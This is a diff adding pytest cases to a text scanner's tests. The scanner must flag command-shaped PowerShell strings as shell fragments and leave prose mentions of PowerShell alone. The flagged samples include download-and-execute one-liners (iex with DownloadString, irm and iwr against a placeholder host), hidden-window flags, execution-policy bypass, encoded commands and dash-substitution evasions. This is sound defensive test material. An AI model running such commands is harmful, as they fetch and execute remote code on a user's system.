@@ -51,6 +51,51 @@ def test_scan_text_clean(text):
     assert scan_text(text) == [], scan_text(text)
 
 
+@pytest.mark.parametrize("text", [
+    "powershell -c Get-Process",
+    "PowerShell -Command \"Get-Date\"",
+    "powershell -enc SQBFAFgA",
+    "powershell -EncodedCommand SQBFAFgA",
+    "powershell -NoProfile -File run.ps1",
+    "powershell -nop -w hidden -c x",
+    "powershell -w hidden",
+    "powershell -ExecutionPolicy Bypass -File a.ps1",
+    "powershell /c dir",
+    "powershell iex (New-Object Net.WebClient).DownloadString('x')",
+    "run powershell.exe from the macro",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "powershell.exe -nop",
+    "pwsh -c ./build.ps1",
+    "pwsh -Command Get-ChildItem",
+    "powershell \"iex (irm https://x.example/a)\"",
+    "powershell ./setup.ps1",
+    "pwsh deploy.ps1",
+    "powershell \u2013Command Get-Date",  # en dash, accepted by PowerShell as a dash
+    "powershell \u2014enc SQBFAFgA",  # em dash
+    "powershell \"& {iwr https://x.example/a}\"",
+    "powershell &{iex $a}",
+    "powershell ; iex $a",
+    "cmd /c powershell",
+    "Start-Process powershell",
+])
+def test_powershell_in_command_shape_is_a_shell_fragment(text):
+    assert "shell_fragment" in codes(scan_text(text)), text
+
+
+@pytest.mark.parametrize("text", [
+    "Skills: Scripting (Bash, Python, PowerShell) - Someone who automates the boring parts",
+    "Experience with PowerShell and Bash is a plus",
+    "We use PowerShell for Windows admin and pwsh on Linux",
+    "Bash/PowerShell/Python scripting",
+    "PowerShell - nice to have",
+    "Knows PowerShell.",
+    "Bash, PowerShell -or- Python",
+    "PowerShell /c# experience",
+])
+def test_powershell_in_prose_is_clean(text):
+    assert scan_text(text) == [], scan_text(text)
+
+
 def test_lookalike_hosts():
     allow = ("confs.tech", "hn.algolia.com", "raw.githubusercontent.com")
     assert is_lookalike("confs.tech.evil.example", allow) == "confs.tech"
